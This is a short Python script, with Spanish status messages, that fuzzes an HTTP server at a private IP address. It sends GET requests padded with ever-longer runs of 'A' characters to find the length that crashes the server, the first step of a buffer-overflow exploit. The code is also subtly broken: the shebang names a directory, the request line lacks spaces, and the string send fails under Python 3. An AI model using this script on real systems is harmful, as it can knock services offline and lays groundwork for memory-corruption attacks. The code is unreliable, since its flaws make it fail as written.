#! /usr/local/bin
import socket

ip='192.168.18.40'
port = 80

buffer = ['A']
count = 100


while len(buffer) < 32:
	buffer.append ('A'*count)
	count += 100

for string in buffer:
	try:
		print("Bytes enviados %i" % (len(string)))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip,port))
		s.send('GET' + string + 'HTTP/1.1\r\n\r\n')
		s.close()
	except:
		print("Error de conexion!")
